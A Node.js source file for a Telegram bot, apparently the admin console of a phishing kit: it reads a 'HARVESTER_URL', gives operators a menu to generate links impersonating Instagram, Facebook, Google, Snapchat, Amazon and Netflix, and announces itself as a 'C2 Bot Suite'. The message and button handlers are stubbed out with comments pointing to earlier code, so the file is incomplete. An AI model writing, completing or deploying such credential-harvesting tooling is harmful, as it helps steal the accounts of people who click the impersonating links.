const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// --- ⚙️ CONFIGURATION (Loaded from Render's Environment Variables) ⚙️ ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const HARVESTER_URL = process.env.HARVESTER_URL;
const OWNER_ID = process.env.OWNER_ID; // Your numeric Telegram ID, the Super Admin
const CHANNEL_ID = process.env.CHANNEL_ID; // Your channel's ID ('@username' or '-100...')
const CHANNEL_LINK = process.env.CHANNEL_LINK; // Your channel's full link ('https://t.me/...')

// Check if all required environment variables are set
if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
    console.error("FATAL ERROR: One or more environment variables are missing.");
    process.exit(1); // Stop the bot if config is incomplete
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const DB_PATH = './db.json';
let adminState = {}; // Tracks multi-step admin actions

// --- DATABASE HELPER FUNCTIONS ---
const readDb = () => {
    if (!fs.existsSync(DB_PATH)) {
        fs.writeFileSync(DB_PATH, JSON.stringify({ users: [], admins: [], blocked_users: [] }, null, 2));
    }
    return JSON.parse(fs.readFileSync(DB_PATH));
};
const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));

// --- ADMIN CHECK FUNCTION ---
const isAdmin = (userId) => {
    const db = readDb();
    return db.admins.includes(userId) || userId.toString() === OWNER_ID;
};

// --- KEYBOARDS ---
const adminKeyboard = [
    [{ text: "📊 User Status", callback_data: "admin_status" }, { text: "📢 Broadcast", callback_data: "admin_broadcast" }],
    [{ text: "🔗 Generate Link", callback_data: "admin_generate_link" }],
    [{ text: "➕ Add Admin", callback_data: "admin_add" }, { text: "➖ Remove Admin", callback_data: "admin_remove" }],
    [{ text: "🚫 Block User", callback_data: "admin_block" }, { text: "✅ Unblock User", callback_data: "admin_unblock" }]
];

const userKeyboard = [
    [{ text: "♻️ Share Bot", callback_data: "user_share" }, { text: "✍️ Feedback", callback_data: "user_feedback" }],
    [{ text: "👑 Owner", callback_data: "user_owner" }]
];

const linkGenerationKeyboard = [
    [{ text: '📸 Instagram', callback_data: 'gen_link_Instagram' }, { text: '📘 Facebook', callback_data: 'gen_link_Facebook' }],
    [{ text: '🇬 Google', callback_data: 'gen_link_Google' }, { text: '👻 Snapchat', callback_data: 'gen_link_Snapchat' }],
    [{ text: '📦 Amazon', callback_data: 'gen_link_Amazon' }, { text: '🎬 Netflix', callback_data: 'gen_link_Netflix' }],
    [{ text: '⬅️ Back to Admin Panel', callback_data: 'admin_panel_back' }]
];

// --- /start COMMAND with FORCE JOIN ---
bot.onText(/\/start/, async (msg) => {
    const userId = msg.from.id;
    const db = readDb();

    if (db.blocked_users.includes(userId)) return;

    try {
        const chatMember = await bot.getChatMember(CHANNEL_ID, userId);
        if (!['member', 'administrator', 'creator'].includes(chatMember.status)) {
            throw new Error("User is not a member of the channel");
        }
        
        if (!db.users.includes(userId)) {
            db.users.push(userId);
            writeDb(db);
            if (userId.toString() !== OWNER_ID) {
                bot.sendMessage(OWNER_ID, `➕ New user joined: ${userId}`);
            }
        }
        
        if (isAdmin(userId)) {
            bot.sendMessage(userId, "👑 **Admin Panel** 👑\nWelcome, Operator.", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
        } else {
            bot.sendMessage(userId, "✅ Welcome! You can use the buttons below.", { reply_markup: { inline_keyboard: userKeyboard } });
        }
    } catch (error) {
        const joinMessage = `🛑 **ACCESS DENIED** 🛑\n\nTo use this bot, you must join our channel first.`;
        bot.sendMessage(userId, joinMessage, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '➡️ Join Channel ⬅️', url: CHANNEL_LINK }],
                    [{ text: '🔄 Joined! Click to Continue 🔄', callback_data: 'check_join' }]
                ]
            }
        });
    }
});

// --- MESSAGE HANDLER for admin replies ---
bot.on('message', (msg) => {
    // ... (This entire section is the same as the previous correct code I sent) ...
});

// --- CALLBACK QUERY HANDLER for button presses ---
bot.on('callback_query', (query) => {
    // ... (This entire section is the same as the previous correct code I sent) ...
});

console.log('🔥 C2 Bot Suite is online and operational.');
